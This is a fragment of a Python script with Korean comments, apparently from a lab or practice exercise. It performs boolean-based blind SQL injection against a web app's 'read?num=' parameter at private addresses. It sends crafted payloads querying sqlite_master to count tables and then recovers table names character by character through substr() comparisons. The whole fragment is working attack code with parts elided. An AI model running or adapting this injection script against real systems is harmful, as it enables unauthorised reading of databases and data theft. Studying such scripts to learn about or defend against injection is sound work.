...
'''
url = "http://192.168.0.209:1111/read?num=6"
user_url = "http://192.168.177.130:5000/myinfo_revision"
def check_db_length(): #데이터베이스 명 길이
    for x in range(7):
        data = "\" and (SELECT count(tbl_name) FROM sqlite_master) = %d --" % (x)
        url_data = url + data        
...
def check_db_name(): #데이터베이스 이름
    database_name = ""
    for index in range(1, 15): #num instaed of check_db_length()
        for str_x in str_alpha:
            #data = " and substr(database(),{},1)='{}'".format(index, str_x)
            data = "\" and substr((SELECT tbl_name FROM sqlite_master limit 1,1),{},1) = \"{}\" --".format(index, str_x)
            url_data = url + data            
            req = requests.get(url_data)            
            if req.status_code == 200:                
                database_name += str_x
                #print database_name
    return "DB 이름은 : {}".format(database_name)
